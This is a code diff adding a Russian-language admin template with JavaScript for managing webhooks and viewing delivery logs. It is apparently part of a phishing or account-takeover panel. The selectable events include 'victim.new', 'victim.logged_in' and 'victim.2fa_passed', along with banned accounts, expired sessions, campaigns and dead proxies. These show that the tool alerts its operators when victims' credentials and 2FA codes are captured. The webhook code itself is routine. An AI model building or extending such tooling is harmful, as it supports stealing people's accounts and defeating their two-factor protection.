@@ -1,0 +1,121 @@
+{% extends "admin/base.html" %}
+{% block title %}Вебхуки{% endblock %}
+{% block content %}
+<div class="p-6 space-y-6">
+    <div class="flex items-center justify-between">
+        <h1 class="text-2xl font-bold text-white">🔔 Вебхуки</h1>
+        <button onclick="document.getElementById('createWebhookModal').classList.remove('hidden')" class="px-4 py-2 rounded-lg text-sm font-medium text-white btn-accent-glow">+ Создать вебхук</button>
+    </div>
+
+    <!-- Webhooks list -->
+    <div class="space-y-3">
+        {% for wh in webhooks %}
+        <div class="bg-panel-card rounded-xl p-4 border border-panel-border">
+            <div class="flex items-center justify-between">
+                <div>
+                    <span class="font-semibold text-white">{{ wh.name }}</span>
+                    <span class="ml-2 text-xs px-2 py-0.5 rounded-full {% if wh.is_active %}bg-green-900 text-green-300{% else %}bg-gray-800 text-gray-400{% endif %}">
+                        {{ 'активен' if wh.is_active else 'неактивен' }}
+                    </span>
+                </div>
+                <div class="flex gap-2">
+                    <button onclick="testWebhook({{ wh.id }})" class="px-3 py-1 text-xs rounded bg-blue-900 text-blue-300 hover:bg-blue-800">Тест</button>
+                    <button onclick="deleteWebhook({{ wh.id }})" class="px-3 py-1 text-xs rounded bg-red-900 text-red-300 hover:bg-red-800">Удалить</button>
+                </div>
+            </div>
+            <div class="mt-2 text-xs text-panel-muted">
+                <span>URL: {{ wh.url }}</span>
+                <span class="ml-4">События: {{ (wh.events or []) | join(', ') or 'нет' }}</span>
+                {% if wh.last_triggered %}<span class="ml-4">Последний: {{ wh.last_triggered | timestamp_to_date }}</span>{% endif %}
+            </div>
+        </div>
+        {% else %}
+        <div class="text-center py-12 text-panel-muted">Вебхуки не настроены</div>
+        {% endfor %}
+    </div>
+
+    <!-- Recent deliveries -->
+    {% if recent_deliveries %}
+    <div>
+        <h3 class="text-sm font-semibold text-panel-muted mb-3">Последние доставки</h3>
+        <div class="bg-panel-card rounded-xl border border-panel-border overflow-hidden">
+            <table class="w-full text-sm">
+                <thead class="bg-panel-surface text-panel-muted text-xs">
+                    <tr>
+                        <th class="px-4 py-2 text-left">Событие</th>
+                        <th class="px-4 py-2 text-left">Статус</th>
+                        <th class="px-4 py-2 text-left">Код</th>
+                        <th class="px-4 py-2 text-left">Время</th>
+                    </tr>
+                </thead>
+                <tbody class="divide-y divide-panel-border">
+                    {% for d in recent_deliveries %}
+                    <tr>
+                        <td class="px-4 py-2 text-white">{{ d.event_type }}</td>
+                        <td class="px-4 py-2"><span class="{% if d.success %}text-green-400{% else %}text-red-400{% endif %}">{{ '✓' if d.success else '✗' }}</span></td>
+                        <td class="px-4 py-2 text-panel-muted">{{ d.response_code or '—' }}</td>
+                        <td class="px-4 py-2 text-panel-muted">{{ d.created_at | timestamp_to_date }}</td>
+                    </tr>
+                    {% endfor %}
+                </tbody>
+            </table>
+        </div>
+    </div>
+    {% endif %}
+</div>
+
+<!-- Create Webhook Modal -->
+<div id="createWebhookModal" class="hidden fixed inset-0 bg-black/60 flex items-center justify-center z-50">
+    <div class="bg-panel-card rounded-xl p-6 w-full max-w-md border border-panel-border">
+        <h3 class="text-lg font-bold text-white mb-4">Создать вебхук</h3>
+        <div class="space-y-3">
+            <input id="whName" type="text" placeholder="Название" class="w-full px-3 py-2 rounded-lg text-sm bg-panel-surface border border-panel-border text-white">
+            <input id="whUrl" type="url" placeholder="URL (https://...)" class="w-full px-3 py-2 rounded-lg text-sm bg-panel-surface border border-panel-border text-white">
+            <input id="whSecret" type="text" placeholder="Секрет (HMAC, опционально)" class="w-full px-3 py-2 rounded-lg text-sm bg-panel-surface border border-panel-border text-white">
+            <div>
+                <p class="text-xs text-panel-muted mb-2">События (выберите):</p>
+                <div class="grid grid-cols-2 gap-1">
+                    {% for ev in ['victim.new','victim.logged_in','victim.2fa_passed','account.banned','account.session_expired','campaign.completed','proxy.dead'] %}
+                    <label class="flex items-center gap-2 text-xs text-panel-muted">
+                        <input type="checkbox" class="wh-event-cb" value="{{ ev }}"> {{ ev }}
+                    </label>
+                    {% endfor %}
+                </div>
+            </div>
+        </div>
+        <div class="flex gap-2 mt-4">
+            <button onclick="createWebhook()" class="flex-1 px-4 py-2 rounded-lg text-sm font-medium text-white btn-accent-glow">Создать</button>
+            <button onclick="document.getElementById('createWebhookModal').classList.add('hidden')" class="flex-1 px-4 py-2 rounded-lg text-sm font-medium text-panel-muted bg-panel-surface border border-panel-border">Отмена</button>
+        </div>
+    </div>
+</div>
+
+<script>
+async function createWebhook() {
+    const events = [...document.querySelectorAll('.wh-event-cb:checked')].map(c => c.value);
+    const res = await fetch('/admin/api/webhooks', {
+        method: 'POST', headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({
+            name: document.getElementById('whName').value,
+            url: document.getElementById('whUrl').value,
+            secret: document.getElementById('whSecret').value,
+            events,
+        })
+    });
+    const d = await res.json();
+    if (d.success) location.reload();
+    else alert(d.error);
+}
+async function deleteWebhook(id) {
+    if (!confirm('Удалить вебхук?')) return;
+    const res = await fetch(`/admin/api/webhooks/${id}`, {method:'DELETE'});
+    const d = await res.json();
+    if (d.success) location.reload();
+}
+async function testWebhook(id) {
+    const res = await fetch(`/admin/api/webhooks/${id}/test`, {method:'POST'});
+    const d = await res.json();
+    alert(d.success ? '✅ Тестовый вебхук отправлен' : `❌ ${d.error}`);
+}
+</script>
+{% endblock %}
